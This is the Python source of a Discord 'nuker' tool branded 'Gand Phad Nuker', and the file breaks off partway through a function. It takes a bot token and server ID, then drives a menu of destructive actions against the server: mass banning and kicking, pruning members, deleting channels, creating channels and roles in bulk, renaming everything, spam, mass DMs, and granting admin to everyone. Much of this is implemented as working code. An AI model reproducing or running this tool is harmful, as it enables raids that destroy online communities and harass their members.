import discord
from discord import Colour, Color
from discord.ext import commands
import asyncio
from pystyle import Center, Colorate, Colors, Write
import os
from colorama import Style
import time
import random
import urllib
import config
from colorama import Fore
from datetime import datetime, timezone
import aiohttp
import datetime
import webbrowser
import os
import sys

current_time = datetime.datetime.now().strftime('%H:%M:%S')

def set_console_title(title):
    if os.name == 'nt':  # Windows
        import ctypes
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    elif os.name == 'posix':  # Linux/MacOS/Termux
        sys.stdout.write(f"\x1b]2;{title}\x07")
    else:
        pass  # Not supported on this OS
set_console_title("Gand Phad Nuker | Fursat/Bxbe™ ~ Wriyansh™")   

def cc():
    os.system('cls' if os.name == 'nt' else 'clear')

os.system("title Login to GPN")

print("\033[1;31m"  # Red color for the main block
      "██████╗ ██████╗ ███╗   ██╗\n"
      "██╔════╝ ██╔══██╗████╗  ██║\n"
      "██║  ███╗██████╔╝██╔██╗ ██║\n"
      "██║   ██║██╔═══╝ ██║╚██╗██║\n"
      "╚██████╔╝██║     ██║ ╚████║\n"
      " ╚═════╝ ╚═╝     ╚═╝  ╚═══╝\n"

      "\033[0;36m"  # Cyan color for the following lines
      "< made by .wriyansh/1qzh. >\n"
      "< Join = https://discord.gg/xoxo >\n"
      "< Git = wpritam >"
      "\033[0m")  # Reset color to default

code = input("\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;209mEnter The Key\n\033[1;37m")
clr = 0x2B2D31

while True:
  if code == "GPN":
    os.system('title Logged!')
    print("\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mLogged!")
    time.sleep(2)
    break
  else:
    os.system('title Invalid Key')
    print("\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;196mInvalid Key!\n")
time.sleep(2)
os.system('title Loading Proxies...')

ascii_art_list = [

    r"""
███████╗██╗  ██╗██╗   ██╗██████╗ ██╗   ██╗    ██╗  ██╗ ██████╗ ██████╗  █████╗ 
██╔════╝██║  ██║██║   ██║██╔══██╗██║   ██║    ██║  ██║██╔═══██╗██╔══██╗██╔══██╗
███████╗███████║██║   ██║██████╔╝██║   ██║    ███████║██║   ██║██████╔╝███████║
╚════██║██╔══██║██║   ██║██╔══██╗██║   ██║    ██╔══██║██║   ██║██╔══██╗██╔══██║
███████║██║  ██║╚██████╔╝██║  ██║╚██████╔╝    ██║  ██║╚██████╔╝██║  ██║██║  ██║
╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
                    Made by Pritam×Riyu  | https://GitHub.com/wpritam
    """,
    r"""
███████╗██╗  ██╗██╗   ██╗██████╗ ██╗   ██╗    ██╗  ██╗ ██████╗ ██████╗  █████╗ 
██╔════╝██║  ██║██║   ██║██╔══██╗██║   ██║    ██║  ██║██╔═══██╗██╔══██╗██╔══██╗
███████╗███████║██║   ██║██████╔╝██║   ██║    ███████║██║   ██║██████╔╝███████║
╚════██║██╔══██║██║   ██║██╔══██╗██║   ██║    ██╔══██║██║   ██║██╔══██╗██╔══██║
███████║██║  ██║╚██████╔╝██║  ██║╚██████╔╝    ██║  ██║╚██████╔╝██║  ██║██║  ██║
╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
                    Made by Pritam×Riyu  | https://GitHub.com/wpritam
    """,
    r"""
███████╗██╗  ██╗██╗   ██╗██████╗ ██╗   ██╗    ██╗  ██╗ ██████╗ ██████╗  █████╗ 
██╔════╝██║  ██║██║   ██║██╔══██╗██║   ██║    ██║  ██║██╔═══██╗██╔══██╗██╔══██╗
███████╗███████║██║   ██║██████╔╝██║   ██║    ███████║██║   ██║██████╔╝███████║
╚════██║██╔══██║██║   ██║██╔══██╗██║   ██║    ██╔══██║██║   ██║██╔══██╗██╔══██║
███████║██║  ██║╚██████╔╝██║  ██║╚██████╔╝    ██║  ██║╚██████╔╝██║  ██║██║  ██║
╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
                    Made by Pritam×Riyu  | https://GitHub.com/wpritam    """,
    r"""
███████╗██╗  ██╗██╗   ██╗██████╗ ██╗   ██╗    ██╗  ██╗ ██████╗ ██████╗  █████╗ 
██╔════╝██║  ██║██║   ██║██╔══██╗██║   ██║    ██║  ██║██╔═══██╗██╔══██╗██╔══██╗
███████╗███████║██║   ██║██████╔╝██║   ██║    ███████║██║   ██║██████╔╝███████║
╚════██║██╔══██║██║   ██║██╔══██╗██║   ██║    ██╔══██║██║   ██║██╔══██╗██╔══██║
███████║██║  ██║╚██████╔╝██║  ██║╚██████╔╝    ██║  ██║╚██████╔╝██║  ██║██║  ██║
╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝       
                    Made by Pritam × Riyu  | https://GitHub.com/wpritam
    """
]

def display_ascii_animation():
    cycles = 1 
    for _ in range(cycles):
        for art in ascii_art_list:
            cc()
            gradient_colors = Colorate.Vertical(Colors.green_to_white, art)
            print(gradient_colors)
            time.sleep(0.5)

display_ascii_animation()
ascii_art =    r"""
███████╗██╗  ██╗██╗   ██╗██████╗ ██╗   ██╗    ██╗  ██╗ ██████╗ ██████╗  █████╗ 
██╔════╝██║  ██║██║   ██║██╔══██╗██║   ██║    ██║  ██║██╔═══██╗██╔══██╗██╔══██╗
███████╗███████║██║   ██║██████╔╝██║   ██║    ███████║██║   ██║██████╔╝███████║
╚════██║██╔══██║██║   ██║██╔══██╗██║   ██║    ██╔══██║██║   ██║██╔══██╗██╔══██║
███████║██║  ██║╚██████╔╝██║  ██║╚██████╔╝    ██║  ██║╚██████╔╝██║  ██║██║  ██║
╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
                    Made by Pritam × Riyu  | https://GitHub.com/wpritam
    """
cc()
gradient_colors1 = Colorate.Vertical(Colors.red_to_yellow, ascii_art)
print(gradient_colors1)
bot_token = input(Colorate.Horizontal(Colors.red_to_yellow, "                                    Token ~ "))
server_id = input(Colorate.Horizontal(Colors.red_to_yellow, "                                    Server ID ~ "))
p = Colors.purple
b = Colors.blue
w = Colors.white
r = Style.RESET_ALL

intents = discord.Intents.all()
intents.guilds = True
bot = commands.Bot(command_prefix="pritamrandi", intents=intents)

def gpn():
    ascii_art = r"""
                                                  ██████╗ ██████╗ ███╗   ██╗
                                                  ██╔════╝ ██╔══██╗████╗  ██║
                                                  ██║  ███╗██████╔╝██╔██╗ ██║
                                                  ██║   ██║██╔═══╝ ██║╚██╗██║
                                                  ╚██████╔╝██║     ██║ ╚████║
                                                   ╚═════╝ ╚═╝     ╚═╝  ╚═══╝                                                                                 
                                                   < made by .wriyansh/1qzh. >
                                                   < Join = https://discord.gg/xoxo >
                                                   < Git = wpritam >           """
    
    gradient_colors = Colorate.Vertical(Colors.purple_to_red, ascii_art)
    print(gradient_colors)


@bot.event
async def on_ready():
    statuses = [
        "Gaand Phaad Nuker ~ Pritam×Riyu™",
        " .@1qzh/@wriyansh.<3",
        "GPN™ <3"
    ]

    async def change_status():
        while True:
            for status in statuses:
                activity = discord.Activity(
                    name=status,
                    type=discord.ActivityType.listening,
                )
                await bot.change_presence(status=discord.Status.idle, activity=activity)
                await asyncio.sleep(5)  # Wait for 5 seconds before changing status

    bot.loop.create_task(change_status())
    cc()
    gpn()
    await show_menu()
async def show_menu():
    while True:
        menu_text = f"""
            ╔═════                   ═════╗   ╔═════                    ═════╗   ╔═════                     ═════╗
                [01] Mass Ban                      [11] Hide Channels                 [21] Rename Guild
                [02] Mass Unban                    [12] Unhide Channels               [22] Avatar Change
                [03] Mass Kick                     [13] Spam Channels                 [23] Change Server
                [04] Prune Member                  [14] Webhook Spam                  [24] Admin Everyone
                [05] Nick all                      [15] Dm All                        [25] Get Admin
                [06] Create Channels               [16] Create Roles                  [26] Get Invite Link
                [07] Delete Channels               [17] Delete Roles                  [27] Discord
                [08] Rename Channels               [18] Rename Roles                  [28] Credit
                [09] Lock Channels                 [19] Full Nuke                     [29] Update
                [10] Unlock Channels               [20] Delete Emojis                 [30] Close
            ╚═════                    ═════╝   ╚═════                   ═════╝   ╚═════                     ═════╝ """
        menu = Colorate.Horizontal(Colors.blue_to_cyan, menu_text)
        print(menu)
        current_time = datetime.datetime.now().strftime('%H:%M:%S')
        choice = await bot.loop.run_in_executor(
            None,
            lambda: input(f"\n{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} INPUT {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}")
        )
        if choice == '1':
            async with aiohttp.ClientSession() as session:
                members = await fetch_members(session)  # Fetch all members in the server
                await asyncio.gather(*[riyu_ban_member(session, member['user']['id']) for member in members])
        elif choice == "2":
            async with aiohttp.ClientSession() as session:
                banned_users = await fetch_banned_users(session)  # Fetch all banned users in the server
                await asyncio.gather(*[unban_user(session, user['user']['id']) for user in banned_users])
        elif choice == "3":
            async with aiohttp.ClientSession() as session:
                members = await fetch_members(session)  # Fetch all members in the server
                await asyncio.gather(*[riyu_kick_member(session, member['user']['id']) for member in members])

        elif choice == "4":
            await prune_members(server_id)
        elif choice == "5":
            new_nickname = input(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} NICKNAME {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}")
            async with aiohttp.ClientSession() as session:
                members = await fetch_members(session)  # Fetch all members in the server
                await asyncio.gather(*[change_nickname(session, new_nickname, member['user']['id']) for member in members])
        elif choice == '6':
            chan_name = input(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} NAME {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}")
            
            amt = int(input(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} AMOUNT {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}"))
            async with aiohttp.ClientSession() as session:
                await asyncio.gather(*[hehe(session, chan_name, 0) for i in range(amt)])
        elif choice == '7':
            await delete_channels(server_id)
        elif choice == '8':
            chan_name = input(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} NAME {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}")
            async with aiohttp.ClientSession() as session:
                channels = await fetch_channels(session)  
                await asyncio.gather(*[riyu_rename_channel(session, chan_name, channel['id']) for channel in channels])
        elif choice == '9':
            await lock_channels(server_id)
        elif choice == '10':
            await unlock_channels(server_id)
        elif choice == '11':
            await hide_channels(server_id)
        elif choice == '12':
            await unhide_channels(server_id)
        elif choice == '13':
            await spam_all_channels(server_id)
        elif choice == '14':
            await webhook_spam(server_id)
        elif choice == '15':
            await dm_all(server_id)
        elif choice == '16':
            role_name = input(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} NAME {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}")
            amt = int(input(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} AMOUNT {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}"))
            async with aiohttp.ClientSession() as session:
                await asyncio.gather(*[riyu_create_roles(session, role_name) for i in range(amt)])
        elif choice == '17':
            roles = await get_roles()
            async with aiohttp.ClientSession() as session:
                await asyncio.gather(*[riyu_delete_role(session, role_id) for role_id in roles])
        elif choice == '18':
            role_name = input(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} NAME {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}")
            async with aiohttp.ClientSession() as session:
                roles = await fetch_roles(session)  # Fetch all roles in the server
                await asyncio.gather(*[riyu_rename_role(session, role_name, role['id']) for role in roles])

        elif choice == '19':
            await nuke(server_id)
            await auto_raid(server_id)
        elif choice == '20':
            await delete_emojis(server_id)
        elif choice == '21':
            await rename_guild(server_id)
        elif choice == '22':
            await change_guild_avatar(server_id)
        elif choice == '23':
            await change_server(server_id)
        elif choice == '24':
            await give_admin_to_everyone(server_id)
        elif choice == '25':
            await get_admin(server_id)
        elif choice == '26':
            await get_invite_links(server_id)
        elif choice == '27':
            webbrowser.open("https://discord.gg/makXEQk2TF")
        elif choice == '28':
            print(f"{Fore.BLUE}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.BLUE}]{Fore.LIGHTBLACK_EX} -{Fore.BLUE} CREDIT {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Made by .wriyansh.#0")
        elif choice == '29':
            webbrowser.open("https://github.com/wpritam")
        elif choice == '30':
            print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Closing Nuker...")
            await bot.close()
            os._exit(0)
        else:
            print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Wrong Choice.")
            time.sleep(1)
            cc()
            gpn()
            continue
        await bot.loop.run_in_executor(None, input,f"{Fore.CYAN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.CYAN}]{Fore.LIGHTBLACK_EX} -{Fore.CYAN} DONE {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Press Enter to return to main menu.")

        cc()
        gpn()



async def ban_all(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print(f"            [{Fore.RED}-{Fore.RESET}] Invalid server ID. Please enter a numeric ID.")
        return

    if guild is None:
        print(f"            [{Fore.RED}-{Fore.RESET}] Server not found.")
        return

    total_members = len(guild.members)
    success_count = 0  # Track successful bans

    ban_tasks = []
    for member in guild.members:
        if member != bot.user:
            ban_tasks.append(ban_member(member))
    
    try:
        results = await asyncio.gather(*ban_tasks, return_exceptions=True)
        for result in results:
            if result is True:  # A successful ban returns True
                success_count += 1
        
        print(f"            [{Fore.GREEN}+{Fore.RESET}] Successfully banned {success_count}/{total_members} members.")
    except discord.Forbidden:
        print(f"            [{Fore.RED}-{Fore.RESET}] Failed to ban members. Missing permissions.")
    except discord.HTTPException as e:
        print(f"            [{Fore.RED}-{Fore.RESET}] Failed to ban members due to HTTPException: {e}")

async def ban_member(member):
    try:
        await member.ban(reason="GAND PHAD Nuker | Wriyansh™", delete_message_days=0)
        print(f"            [{Fore.GREEN}+{Fore.RESET}] {member.id} got banned.")
        return True  # Return True for successful ban
    except discord.Forbidden:
        print(f"            [{Fore.RED}-{Fore.RESET}] Failed to ban {member.name}#{member.discriminator}. Missing permissions.")
        return False  # Return False for failure
    except discord.HTTPException as e:
        print(f"            [{Fore.RED}-{Fore.RESET}] Failed to ban {member.name}#{member.discriminator} due to HTTPException: {e}")
        return False  # Return False for failure



async def unban_all(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print(f"            [{Fore.RED}-{Fore.RESET}]Invalid server ID. Please enter a numeric ID.")
        return

    if guild is None:
        print(f"            [{Fore.RED}-{Fore.RESET}]Server not found.")
        return

    try:
        bans = []
        async for ban_entry in guild.bans():
            bans.append(ban_entry)

        unban_tasks = []

        for ban_entry in bans:
            user = ban_entry.user
            unban_tasks.append(unban_member(guild, user))

        await asyncio.gather(*unban_tasks)
        print(f"            [{Fore.GREEN}+{Fore.RESET}] All members unbanned successfully.")
    except discord.Forbidden:
        print(f"            [{Fore.RED}-{Fore.RESET}]Failed to unban members. Missing permissions.")
    except discord.HTTPException as e:
        print(f"            [{Fore.RED}-{Fore.RESET}]Failed to unban members due to HTTPException: {e}")

async def unban_member(guild, user):
    try:
        await guild.unban(user, reason="Gand Phad Nuker | wriyansh™")
        print(f"            [{Fore.GREEN}+{Fore.RESET}] {user.id} got unbanned.")
    except discord.Forbidden:
        print(f"            [{Fore.RED}-{Fore.RESET}]Failed to unban {user.name}#{user.discriminator}. Missing permissions.")
    except discord.HTTPException as e:
        print(f"            [{Fore.RED}-{Fore.RESET}]Failed to unban {user.name}#{user.discriminator} due to HTTPException: {e}")



async def kick_all(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print(f"            [{Fore.RED}-{Fore.RESET}]Invalid server ID. Please enter a numeric ID.")
        return

    if guild is None:
        print(f"            [{Fore.RED}-{Fore.RESET}]Server not found.")
        return

    total_members = len(guild.members)
    success_count = 0  # Track successful kicks

    try:
        kick_tasks = []

        for member in guild.members:
            if member != bot.user:
                kick_tasks.append(kick_member(member))

        results = await asyncio.gather(*kick_tasks, return_exceptions=True)
        for result in results:
            if result is True:  # A successful kick returns True
                success_count += 1

        print(f"            [{Fore.GREEN}+{Fore.RESET}] Successfully kicked {success_count}/{total_members} members.")
    except discord.Forbidden:
        print(f"            [{Fore.RED}-{Fore.RESET}]Failed to kick members. Missing permissions.")
    except discord.HTTPException as e:
        print(f"            [{Fore.RED}-{Fore.RESET}]Failed to kick members due to HTTPException: {e}")

async def kick_member(member):
    try:
        await member.kick(reason="Gand Phad Nuker | wriyansh™")
        print(f"            [{Fore.GREEN}+{Fore.RESET}] {member.id} got kicked.")
        return True  # Return True for successful kick
    except discord.Forbidden:
        print(f"            [{Fore.RED}-{Fore.RESET}]Failed to kick {member.name}#{member.discriminator}. Missing permissions.")
        return False  # Return False for failure
    except discord.HTTPException as e:
        print(f"            [{Fore.RED}-{Fore.RESET}]Failed to kick {member.name}#{member.discriminator} due to HTTPException: {e}")
        return False  # Return False for failure


async def prune_members(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Invalid Server ID.")
        return

    if guild is None:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Server not found.")
        return

    try:
        days = int(await asyncio.to_thread(input,f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} DAYS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}"))
        
        if days < 1:
            print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Number of days must be at least 1.")
            return

        pruned = await guild.prune_members(days=days, compute_prune_count=True, reason="Gand Phad Nuker | Wriyansh™")
        if pruned is not None and pruned > 0:
            print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Successfully pruned {pruned} members inactive for {days} days.")
        else:
            print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}No members were inactive for {days} days.")
    except ValueError:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Invalid number of days. Please enter a numeric value.")
    except discord.Forbidden:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to prune members. Missing permissions.")
    except discord.HTTPException as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to prune members due to HTTPException: {e}")


headers = {
        "Authorization": f"Bot {bot_token}"
    }

async def nick_all(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print(f"            [{Fore.RED}-{Fore.RESET}]Invalid server ID. Please enter a numeric ID.")
        return

    if guild is None:
        print(f"            [{Fore.RED}-{Fore.RESET}]Server not found.")
        return

    new_nick = await asyncio.to_thread(input,f"            Enter the new nickname for all members: ")

    try:
        nick_tasks = []

        for member in guild.members:
            if member != bot.user and member.guild_permissions.manage_nicknames:
                nick_tasks.append(change_nick(member, new_nick))

        await asyncio.gather(*nick_tasks)
        print(f"            [{Fore.GREEN}+{Fore.RESET}] All nicknames changed successfully.")
    except discord.Forbidden:
        print(f"            [{Fore.RED}-{Fore.RESET}]Failed to change nicknames. Missing permissions.")
    except discord.HTTPException as e:
        print(f"            [{Fore.RED}-{Fore.RESET}]Failed to change nicknames due to HTTPException: {e}")

async def change_nick(member, new_nick):
    try:
        await member.edit(nick=new_nick, reason="Gand Phad Nuker | Wriyansh™")
        print(f"            [{Fore.GREEN}+{Fore.RESET}] {member.id}'s nickname changed to {new_nick}.")
    except discord.Forbidden:
        print(f"            [{Fore.RED}-{Fore.RESET}]Failed to change nickname for {member.name}#{member.discriminator}. Missing permissions.")
    except discord.HTTPException as e:
        print(f"            [{Fore.RED}-{Fore.RESET}]Failed to change nickname for {member.name}#{member.discriminator} due to HTTPException: {e}")


async def hehe(session,channel_name, type:int=0):
    while True:
        try:
            async with session.post(f'https://discord.com/api/v9/guilds/{server_id}/channels', headers=headers, json={'name': channel_name, 'type': type}) as r:
                if r.status == 429:
                    print(f"{Fore.YELLOW}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.YELLOW}]{Fore.LIGHTBLACK_EX} -{Fore.YELLOW} RATELIMITED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}TRYING SOON...")
                    
                else:
                    if r.status in [200, 201, 204]:
                        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Created Channel to {server_id} - {channel_name}")
                        
                        break
                    else:
                        break
        except:
            print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Couldn't Create Channel to {server_id}")
            pass



async def create_channel(guild, name):
    try:
        # Specify the channel type (text, voice, etc.)
        channel = await guild.create_text_channel(name)
        print(f"            [{Fore.GREEN}+{Fore.RESET}] Channel '{channel.name}' created successfully.")
        return True  # Return True for successful creation
    except Exception as e:
        print(f"            [{Fore.RED}-{Fore.RESET}] Failed to create channel '{name}': {e}")
        return False  # Return False for failure



async def delete_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Invalid Guild ID.")

        return

    if guild is None:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Server Not Found.")
        return

    try:
        channels = guild.channels
        total_channels = len(channels)
        success_count = 0  # Track successfully deleted channels

        delete_tasks = [delete_channel(channel) for channel in channels]
        results = await asyncio.gather(*delete_tasks, return_exceptions=True)

        for result in results:
            if result is True:  # Successful deletion returns True
                success_count += 1

        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Successfully deleted {success_count}/{total_channels} channels.")
        
    except Exception as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Error deleting channels: {e}")
        


async def delete_channel(channel):
    try:
        await channel.delete()
        print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Channel '{channel.name}' deleted successfully.")
        
        return True  # Return True for successful deletion
    except Exception as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to delete channel '{channel.name}': {e}")
        
        return False  # Return False for failure
    

async def fetch_channels(session):
    url = f'https://discord.com/api/v9/guilds/{server_id}/channels'
    headers = {'Authorization': f'Bot {bot_token}'}  # Make sure bot_token is defined
    async with session.get(url, headers=headers) as response:
        if response.status == 200:
            return await response.json()  # Returns the list of channels
        else:
            print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to fetch channels")
            return []

async def fetch_roles(session):
    url = f'https://discord.com/api/v9/guilds/{server_id}/roles'
    headers = {'Authorization': f'Bot {bot_token}'}  # Ensure bot_token is defined
    async with session.get(url, headers=headers) as response:
        if response.status == 200:
            return await response.json()  # Returns the list of roles
        else:
            print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to fetch roles")
            return []
        
async def riyu_rename_channel(session, new_name, channel_id):
    url = f'https://discord.com/api/v9/channels/{channel_id}'
    headers = {'Authorization': f'Bot {bot_token}'}
    data = {
        'name': new_name
    }
    try:
        async with session.patch(url, headers=headers, json=data) as response:
            if response.status == 429:
                print(f"{Fore.YELLOW}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.YELLOW}]{Fore.LIGHTBLACK_EX} -{Fore.YELLOW} RATELIMITED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}TRYING SOON...")
            else:
                if response.status == 200:
                    print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Renamed Channel {channel_id} to {new_name}.")
                else:
                    print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Couldn't rename channel {channel_id}.")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Error renaming channel {channel_id}: {e}")


async def fetch_banned_users(session):
    url = f'https://discord.com/api/v9/guilds/{server_id}/bans'
    headers = {'Authorization': f'Bot {bot_token}'}  # Ensure bot_token is defined
    async with session.get(url, headers=headers) as response:
        if response.status == 200:
            return await response.json()  # Returns the list of banned users
        else:
            print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} ERROR {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Failed to fetch banned members")
            return []

async def unban_user(session, user_id):
    url = f'https://discord.com/api/v9/guilds/{server_id}/bans/{user_id}'
    headers = {'Authorization': f'Bot {bot_token}'}
    try:
        async with session.delete(url, headers=headers) as response:
            if response.status == 429:
                print(f"{Fore.YELLOW}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.YELLOW}]{Fore.LIGHTBLACK_EX} -{Fore.YELLOW} RATELIMITED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}TRYING SOON...")
            else:
                if response.status == 204:
                    print(f"{Fore.GREEN}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.GREEN}]{Fore.LIGHTBLACK_EX} -{Fore.GREEN} SUCCESS {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Unbanned User {user_id}")
                else:
                    print(f"{Fore.RED}[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RED}]{Fore.LIGHTBLACK_EX} -{Fore.RED} FAILED {Fore.LIGHTBLACK_EX}~ {Fore.WHITE}Couldn't unban user {user_id}")
    except Exception as e:
